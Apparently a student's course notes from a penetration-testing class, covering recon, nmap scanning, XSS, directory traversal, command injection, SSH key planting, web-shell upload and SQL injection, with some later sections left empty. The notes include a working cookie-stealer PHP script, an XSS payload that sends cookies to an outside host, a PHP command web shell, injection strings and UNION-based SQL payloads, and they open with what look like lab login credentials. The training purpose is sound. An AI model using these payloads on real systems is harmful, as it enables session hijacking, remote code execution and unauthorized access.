GRRG-503-M
9GbRCKc43SzluEG
10.50.39.165
student:9GbRCKc43SzluEG
!! Why do they not post the Student Facilitation Guide the day before class, the first day has too much information too fast and it is stressful. It would be less stressful if they just released the FG
the night before, setting us up for success !!

#############################################
Penetration Testing Phases :: Network Scanning/Recon :: Exploitation Research
#############################################
--- Penetration Testing Phases ---
* Penetration testing is used to expose vulnerabilities *
Phase 1 - Mission Definition
  mission goals and targets
  scope of mission
  Rules of Engagement (RoE)
Phase 2 - Recon
  gathering information from public sources
Phase 3 - Footprinting
  scanning or interaction with the target
Phase 4 - Exploitation and Initial Access
Phase 5 - Post-Exploitation
  establish persistence
  escalate privileges
  cover tracks
  exfilitrate data
Phase 6 - Document Mission

--- Scanning and Reconnaissance ---
OSINT -  Open Source Intelligence
  https://webbreacher.files.wordpress.com/2018/07/data-collection3.png?w=1136
1. Host Discovery
  Ping Sweep - to see what hosts are alive quickly (narrow the scope)
2. Port Enumeration
  Nmap Scan - will check to see what ports are available
3. Port Interrogation
  what service is running on each open port
Hyper-Text Markup Language (HTML) - Markup language for browser interpretation
NMAP Scripts 
  /usr/share/nmap/scripts
  nmap --script <filename>|<category>|<directory>
  nmap --script-help
  nmap --script-help <filename>|<category>|<directory>

--- SCRAPE DEMO ---
Run firefox from terminator
  Google "Quotes to Scrape"
    https://quotes.toscrape.com/
sudo apt-get install python-lxml python-requests python3-pip -y
vim webscrapper.py   # scrapes the website to grab indivudal tags and data from them
  change class, tag, and website as needed
--- PING SWEEP DEMO ---
for i in {1..254}; do(ping -c 1 10.50.22.$i | grep "bytes from" &) ; done
  IN-DEPTH (IP-ONLY) 
    for i in {1..254}; do(ping -c 1 10.50.22.$i | grep "bytes from" &) ; done | awk '{print $4}' | sed 's/.$//'
--- NMAP DEMO ---
nmap -v -sT -Pn -T4 <IP_Address>
  nmap -v -sT -Pn -T4 <IP_Address> -p-  # deliberate scan for every port
nmap -v -sT -Pn -T4 --script http-robots.txt.nse <IP_Address> -p 80  # in-depth on service on port 80 using nmap script http-robots.txt.nse
nmap -v -sT -Pn -T4 --script http-enum.nse <IP_Address> -p 80  # more aggressive search for service on port 80 using nmap script http-enum.nse
nmap -v -sT -Pn -T4 --script discovery <IP_Address> # extracts as much information as possible on all open ports
sudo apt-get install nikto
  nikto -h <IP_Address>
--- VULNERABILITY DEMO ---
Google Exploit DB
  search term you want to find exploits on

#############################################
Web Exploitation (xss,cmd injection, etc)
#############################################

xfreerdp /u:student /v:10.50.37.177 +glyph-cache +clipboard +dynamic-resolution
Server - provides services
Client - requests services
HTTP Methods ::
  Get - pulling information from a web server
  Post - posting information to the web server
  Head - etrieve meta-information about a resourceof a web server without transmitting actual data.
  Put - replaces some already existing information on the web server
HTTP Response Code ::
  10X == Informational
  2XX == Success
  30X == Redirection
  4XX == Client Error
  5XX == Server Error
User-Agent String - identifies the client's browser and operating system
Cross-Site Scripting (XSS)
  A form of attack where untrusted javascript is injected into a trusted website
  This occurs when input from a user is displayed back without proper sanitization.
    such as GET POST and PUT
  Allows stealing of cookies, and session hijacking
  Reflected  :: not persistent, reflects off the web server
    When a user is tricked into clicking on a malicious link, the injected code travels to the vulnerable web site. The browser then executes the code because it came from a "trusted" server
  Stored :: Actually stored on the web server, more persistent
    Where the injected script is permanently stored on the target servers. The victim then retrieves the malicious script from the server when it requests the stored information
Server-Side Injection
  Directory Traversal :: accessing the file system of that web server that outside of the intended scope of the developers
  Command Injection :: some input received from a user is used in command execution on the server-side in a way that allows a malicious actor to execute additional arbitrary commands 
  SSH Key Upload :: By uploading our key to the target, we can give ourselves access without needing a password

--- JAVA SCRIPT DEMO ---
1. Go to the web server   # <IP_Address>
  You can use your nmap scripts to see what webpages are available such as http-robots.txt.nse and http-enum.nse
2. Navigate to <IP_Address>/robots.txt   # shows you where you are allowed and not allowed to go
3. Navigate to <IP_Address>/java   # Java script pages
4. Open up DevConsole   # Hit F12
  Here you are reading the Java code trying to understand it as if you were reading psuedocode
--- STORED XSS DEMO ---
1. Navigate to web server
2. Navigate to <IP_Address>/chat/messageb.php
3. Make a document in /var/www/html called cookiefile.txt
4. Make a document in / called Cookie_stealer1.php and input
  <?php
  $cookie = $_GET["username"];
  $steal = fopen("/var/www/html/cookiefile.txt", "a+");
  fwrite($steal, $cookie ."\n");
  fclose($steal);
  ?>
4.. Enter following code for cookie stealer script
 <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>
5. Now look at the URL
    <script> "hello" </script>  # if this works than it accepts untrusted javascript code
--- SERVER-SIDE INJECTION DEMO ---
1. Navigate to <IP_Address>/path
  in pathdemo.php
    ../../../../../etc/passwd   # the ../ is because we do not know where we land in the directory so we need to naviagte far bar to read the files
      this gives us all of the user-names specifically www-data and their home directory   # www-data is the admin for the webserver
    ../../../../../etc/hosts
--- COMMAND INJECTION DEMO ---
1. Navigate <IP_Address>/cmdinjection
  in cmdinjectiondemo.php
    ;whoami  # the command will only work if the semi-colon is placed in front of the command
    ;cat /etc/passwd
    ;ls -latr /var/www
    ;cat /etc/hosts
    ;netstat -ntulp
--- SSH KEY UPLOAD ---
1. on lin-ops create ssh public key
  do not change location or enter passphrase
  copy the public key
2. Command injection
  see above
  ;whoami
  ;cat /etc/passwd
  ;ls -la /var/www   # home directory of web server admin
  ;mkdir /var/www/.ssh   # making ssh directory
  ;ls -la /var/www/   # validating there is a .ssh director
  ;cat /var/www/.ssh/authorized_keys  # file should already be generated
3. upload key to authorized key file
  ;echo "<ssh_key>" >> /var/www/.ssh/authorized_keys
  ;cat /var/www/.ssh/authorized_keys
4. On the linops
  ssh www-data@<IP_Address>
    no password needed
--- MALICIOUS FILE UPLOAD DEMO ---
1. Navigate to <IP_Address to <IP_Address>/uploads
2. Make a script on your rdp session in notepad and save it as badupload.php on your desktop
    <HTML><BODY>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <?php
    if($_GET['cmd']) {
      system($_GET['cmd']);
      }
    ?>
    </pre>
    </BODY></HTML>
3. Upload it to the site
4. Go to the parent directory and navigate to the uplaod
  cat /etc/passwd

#############################################
Web Exploitation - SQL Injection
#############################################
Structured Query Language (SQL) 
COMMANDS ::
  select  - extracts data
  uinion  - combine results of two or more select statements
  use  - selects database for use
  update
  delete
  insert into 
SQL Injection ::
  Require valid SQL queries
  Systems can be vulnerable dur to misconfiguration
  Information_Schema is default and always exists
  Input field Sanitization
    Unsanitized - can be found using single quotes; will return extra information, may show no errors
    Sanitized - input fields are checked for items that might harm the database
    Validation - checks to ensure input meets criteria

--- EXAMPLES ---
SELECT * FROM table_name # selects all column values
SELECT column1,column2,etc FROM table_name  # selects multiple columns from a given table
SELECT column FROM table_name  # selects all column value even duplicates
SELECT DISTINCT column FROM table_name  # shows only distinct colomn values
--- SQL INJECTION VALIDATION DEMO ---
1. Go to web server <IP_Address>
2. Check to see whats normal
  try and normal password and username
3. Try SQL Injection Validation
  joe' OR 1='1  for both username and password
4. Pull up DevTools and go under Network, click login.php, and switch it to request and raw on the right side
5. In your search bar enter the following formation
  <IP_Address>/login.php?username=joe' OR 1='1&passwd=joe' OR 1='1
    sometimes just type or 1=1 with no qoutes if ' OR 1='1 doesn't work
6. whatever the hell this is 
  <IP_Address>/uniondemo.php?Selection=2 UNION select table_schema, table_name, column_name FROM information_schema.columns
  ex->
  http://10.50.40.232/uniondemo.php?Selection=3 UNION SELECT username,passwd,pin FROM session.userinfo
  http://10.50.40.232/uniondemo.php?Selection=3 UNION SELECT id,name,pass FROM session.user
7. Version information
  <IP_Address>/uniondemo.php?Selection=3 UNION select 1,2,@@version
  ex->
  10.50.40.232/uniondemo.php?Selection=3 UNION select 1,2,@@version
#############################################
Reverse Engineering 1-3
#############################################









#############################################
Exploit Development - Functional :: Exploit Development - Buffer Overflow 1-2
#############################################









#############################################
Post exploitation :: Local Host Enumeration
#############################################





#############################################
Privilege Escalation :: Maintaining Persistence :: Covering Tracks - Windows
#############################################







#############################################
Privilege Escalation Activities :: Maintaining Persistence Activities :: Covering Tracks - Linux
#############################################





